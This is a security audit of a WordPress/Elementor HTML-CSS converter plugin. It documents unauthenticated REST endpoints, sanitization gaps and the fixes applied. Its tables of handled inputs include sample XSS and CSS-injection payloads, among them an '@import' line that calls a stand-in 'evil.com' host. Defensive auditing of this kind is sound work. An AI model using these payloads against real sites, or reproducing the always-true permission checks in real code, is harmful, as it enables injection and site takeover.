# Security Audit: elementor-html-css-converter

**Date:** 2026-02-09
**Scope:** All REST API endpoints, input sanitization, CSS/HTML processing, data storage

---

## Executive Summary

The plugin has **critical** security vulnerabilities that must be addressed before production use. The most severe issue is that **all endpoints are publicly accessible without authentication**. Additional open items include an unsanitized `options` parameter and an SVG security bypass handler that should be gated behind authentication.

Several input sanitization gaps have been resolved during this audit:
- CSS-specific attack vectors (`expression()`, `url(javascript:)`, `behavior`, `-moz-binding`, `@import`) are now blocked in `Css_Converter`
- `widgetSettings` is now recursively sanitized via `wp_strip_all_tags()`
- SVG content is sanitized at extraction, import, and storage layers
- `/import-results` webhook now rejects payloads containing `<script>`, stores only sanitized fields, and auto-deletes results after retrieval

---

## Open Issues

### 1. Authentication: All Endpoints Return `true`

**Severity: CRITICAL**

Every single permission callback in the plugin returns `true`, granting unauthenticated public access to all endpoints.

| File | Code |
|---|---|
| `class-rest-api.php` | `return true;` |
| `class-variables-rest-api.php` | `return true;` |
| `class-classes-rest-api.php` | `return true;` |
| `class-import-rest-api.php` | `'permission_callback' => '__return_true'` |

**Impact:** Any unauthenticated visitor or external attacker can:
- Create WordPress posts/pages
- Modify existing Elementor documents
- Import CSS variables and global classes into the active Elementor kit
- Delete Elementor templates
- Trigger external scraper workflows
- Store arbitrary data in the `wp_options` table

**Fix:** All endpoints must check `current_user_can( 'edit_posts' )` at minimum. The `/import-results` webhook endpoint should use its existing token-based auth (which it does), but the remaining endpoints need WordPress capability checks.

---

### 2. The `options` Parameter Has No Sanitization

**Severity: MEDIUM**

The `/convert-html` endpoint accepts an `options` object with no sanitization:

```
'options' => [
    'type'    => 'object',
    'default' => [],
],
```

This object is passed to `html_converter->convert_html_to_atomic_widgets()`. While the impact depends on how the converter uses these options, unvalidated input to processing logic can lead to unexpected behavior.

---

### 3. SVG Security Bypass Handler

**Severity: MEDIUM**

`class-svg-security-bypass-handler.php` bypasses Elementor's SVG security checks for unauthenticated REST API requests. SVG content is now sanitized at multiple layers (see Resolved Items), but the bypass handler itself still allows unauthenticated SVG uploads. This should be resolved by enabling authentication (issue #1).

---

### 4. No CSRF / Nonce Verification on REST Endpoints

**Severity: MEDIUM** (becomes HIGH once authentication is enabled)

None of the REST endpoints verify WordPress nonces. While WordPress REST API endpoints authenticated via cookies automatically verify the `X-WP-Nonce` header, this only applies if `permission_callback` checks `current_user_can()`. Since all callbacks return `true`, nonce verification is never triggered.

Once authentication is enabled, the WordPress REST API infrastructure will handle nonce verification automatically for cookie-authenticated requests. No additional code changes needed for this, but ensure cookie-based REST authentication is used.

---

## Resolved Items

### `<script>` Tags in CSS Values

`sanitize_textarea_field()` calls `wp_strip_all_tags()` on all `cssString` parameters, stripping `<script>` and all other HTML tags before the CSS parser processes the input.

For the `/convert-html` endpoint, `wp_kses()` strips `<script>` tags from the entire HTML document including content inside `<style>` blocks.

| Input | After sanitization |
|---|---|
| `color: red; <script>alert(1)</script>` | `color: red; alert(1)` |
| `background: url("</style><script>xss</script>")` | `background: url("xss")` |
| `content: "<img onerror=alert(1)>"` | `content: "alert(1)"` |

---

### CSS-Specific Attack Vectors

Dedicated CSS sanitization was added to `class-css-converter.php` at three points (`parse_css_string()`, `convert_properties_to_atomic()`, `format_custom_css()`) covering all CSS processing paths:

| Vector | Example | How it's handled |
|---|---|---|
| `expression()` (IE) | `width: expression(alert(1))` | `expression(` stripped from values |
| `url(javascript:)` | `background: url(javascript:alert(1))` | `url(javascript:` stripped from values |
| `-moz-binding` (Firefox) | `-moz-binding: url(evil.xml#xss)` | Property blocked entirely |
| `behavior` (IE) | `behavior: url(malicious.htc)` | Property blocked entirely |
| `@import` injection | `@import url(https://evil.com/steal.css)` | `@import` stripped from raw CSS |

---

### `widgetSettings` Sanitization

A recursive `sanitize_widget_settings()` method was added to `class-rest-api.php`. It walks the entire object tree and calls `wp_strip_all_tags()` on every string value and key. Both `/create-post-with-widget` and `/add-widget-to-post` endpoints use it:

```php
'widgetSettings' => [
    'type'              => 'object',
    'default'           => [],
    'sanitize_callback' => [ $this, 'sanitize_widget_settings' ],
],
```

---

### SVG Content Sanitization

SVG content is sanitized at four defense layers:

1. `wp_kses()` strips `<script>` and disallowed tags from HTML input
2. `sanitize_svg_content()` in `class-atomic-data-parser.php` strips dangerous elements at extraction time (`<script>`, `<foreignObject>`, `<iframe>`, `<object>`, `<embed>`, event handler attributes, `javascript:` URLs)
3. `strip_dangerous_svg_elements()` in `class-image-import-service.php` strips dangerous elements before SVG import
4. Elementor's `Svg::sanitizer()` performs final sanitization before file storage

---

### `/import-results` Webhook Sanitization

The `receive_results()` handler in `class-import-rest-api.php` now applies three security measures:

1. **Script rejection** -- the entire payload is serialized and checked for `<script` (case-insensitive). If found, the request is rejected with a `400` error before anything is stored.
2. **Sanitized storage** -- only three fields are extracted and sanitized before storage: `status` (`sanitize_text_field`), `error` (`sanitize_text_field`), and `results.converter.template_id` (`absint`). The raw scraper payload is discarded.
3. **Auto-cleanup** -- `get_results()` deletes the job entry from `wp_options` immediately after returning the data to the frontend, preventing accumulation of stale results.

**Future improvement:** The `wp_options` storage should be removed entirely. The current webhook-and-poll pattern creates database overhead that is unnecessary. A future refactor should eliminate the intermediate storage step so that scraper results flow directly into Elementor templates without persisting raw data in the database.

---

### CSS Regex Parser Implicit Validation

The CSS parser regex in `class-css-converter.php` provides implicit protection:

```
/([a-zA-Z0-9-]+)\s*:\s*([^;]+);?/
```

- **Property names** are restricted to `[a-zA-Z0-9-]+` — no special characters like `<`, `>`, `"`, `'`, `(`, `)` can appear in property names.
- **Property values** match `[^;]+` — permissive, but values have already been through `sanitize_textarea_field()` and CSS-specific sanitization before reaching the regex.

---

## Summary of Risks by Endpoint

| Endpoint | Auth | Input Sanitization | Risk Level |
|---|---|---|---|
| `POST /css-to-atomic` | NONE | `sanitize_textarea_field` + CSS sanitization | CRITICAL (auth) |
| `POST /apply-styles-to-widget` | NONE | `sanitize_textarea_field` + `absint` + `sanitize_text_field` + CSS sanitization | CRITICAL (auth) |
| `POST /create-post-with-widget` | NONE | `wp_strip_all_tags` (recursive) on widgetSettings, CSS sanitization | CRITICAL (auth) |
| `POST /add-widget-to-post` | NONE | `wp_strip_all_tags` (recursive) on widgetSettings, CSS sanitization | CRITICAL (auth) |
| `POST /convert-html` | NONE | `wp_kses` on html, SVG sanitization, CSS sanitization, **no sanitize on options** | CRITICAL (auth) |
| `POST /import-variables` | NONE | `sanitize_textarea_field` on css | CRITICAL (auth) |
| `POST /import-classes` | NONE | `sanitize_textarea_field` on css | CRITICAL (auth) |
| `POST /trigger-import` | NONE | `esc_url_raw` + `sanitize_text_field` | CRITICAL (auth) |
| `POST /import-results` | Token | Script rejection, sanitized fields only | LOW |
| `GET /import-results/{job_id}` | NONE | `sanitize_text_field` on job_id, auto-deletes after retrieval | MEDIUM (auth) |
| `DELETE /template/{id}` | NONE | `absint` on id | CRITICAL (auth) |

---

## Recommended Fixes (Priority Order)

### P0 — Must fix before any production use

1. **Enable authentication on all endpoints:**

```php
public function check_permissions(): bool {
    return current_user_can( 'edit_posts' );
}
```

2. **Add sanitize_callback to `options`** — validate expected keys and sanitize values.

### P1 — Should fix before production

3. **Remove SVG security bypass** for unauthenticated requests, or gate it behind authenticated requests only.

### P2 — Good to have

4. **Rate limiting** on endpoints to prevent abuse.

5. **Validate `widgetType`** against a whitelist of known Elementor widget types.

6. **Add `GET /import-results/{job_id}` authentication** so scraped results are not publicly readable.

